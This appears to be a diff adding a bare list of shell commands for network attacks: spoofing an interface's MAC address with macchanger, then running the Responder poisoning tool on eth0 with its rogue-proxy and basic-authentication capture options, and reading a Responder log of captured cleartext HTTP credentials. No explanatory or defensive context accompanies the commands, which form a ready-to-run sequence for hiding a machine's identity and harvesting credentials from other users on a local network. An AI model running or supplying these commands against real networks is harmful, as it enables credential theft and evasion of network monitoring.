@@ -1,0 +1,14 @@
+sudo apt-get install macchanger
+ifconfig
+ifconfig eth0 down
+macchanger -r eth0
+macchanger -m 00:d0:70:00:20:69 eth0
+macchanger -s eth0
+macchanger -p eth0
+ifconfig eth0 update
+
+sudo apt-get install responder
+responder -I -A eth0
+responder -I eth0
+responder -I -wbF eth0
+cat /usr/share/responder/logs/HTTP-Basic-ClearText-10.0.2.15.txt
